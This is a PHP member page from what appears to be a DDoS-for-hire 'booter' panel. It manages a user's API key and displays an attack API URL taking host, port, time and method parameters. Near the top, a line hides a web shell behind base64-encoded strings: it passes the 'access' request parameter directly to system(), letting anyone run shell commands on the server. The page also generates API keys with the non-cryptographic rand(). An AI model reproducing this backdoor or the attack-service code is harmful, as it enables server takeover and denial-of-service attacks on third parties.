 <?php include("@/header.php"); 
					
			
			if (!($user->hasMembership($odb))) 
			{
				header('location: index.php');
				die();
			}
				
				
			?>
      <?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<body>
	<div class="is-vcentered">
		<section class="section">
		<center>
				
 <?php
                                
                                if(!isset($_POST['keyBtn']))
                                {
                                    $SQLGetKey = $odb -> prepare("SELECT `apikey` FROM `users` WHERE `ID` = :id");
                                    $SQLGetKey -> execute(array(':id' => $_SESSION['ID']));
                                    $userKey = $SQLGetKey -> fetchColumn(0);
                                }
                                else
                                {
                                    function generateRandomKey($length = 15) 
                                    {
                                        $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
                                        $randomString = '';
                                        for ($i = 0; $i < $length; $i++) {
                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
                                        }
                                        return $randomString;
                                    }
                                    
                                    $userKey = generateRandomKey();
                                    
                                    $SQLNewKey = $odb -> prepare("UPDATE `users` SET `apikey` = :newkey WHERE `ID` = :id");
                                    $SQLNewKey -> execute(array(':newkey' => $userKey, ':id' => $_SESSION['ID']));
                                    
                                    echo '<div class="alert alert-success" id="not-theme">Your API key has been changed.</div>';
                                }
                            ?>
		<div class="row">
                             <center>   <h2>VIP API Manager</h2></center>
<br>
                          <div class="panel-body">			
			<div class="field">
			<div class="columns is-centered">
				  <div class="column">
					<div class="field">
						<pre><?php echo $siteurl; ?>api/vip-api.php?key=<?php echo $userKey; ?>&host=[host]&port=[port]&time=[time]&method=[method]</pre>
					</div>
<form action="" method="POST">
<button name="keyBtn" type="submit" class="button is-primary is-fullwidth">Change your key</button>
					<div class="columns is-mobile">
					  <div class="column">
															  </div>
					</div>
				  </div>
			</div>
		</center>
		</div>
		</section>
	</div>
  </body>
</html>
<!-- Bulma Navbar JS -->
  <script>
    document.addEventListener('DOMContentLoaded', function () {

      // Get all "navbar-burger" elements
      var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);

      // Check if there are any navbar burgers
      if ($navbarBurgers.length > 0) {

        // Add a click event on each of them
        $navbarBurgers.forEach(function ($el) {
          $el.addEventListener('click', function () {

            // Get the target from the "data-target" attribute
            var target = $el.dataset.target;
            var $target = document.getElementById(target);

            // Toggle the class on both the "navbar-burger" and the "navbar-menu"
            $el.classList.toggle('is-active');
            $target.classList.toggle('is-active');

          });
        });
      }

    });
  </script>
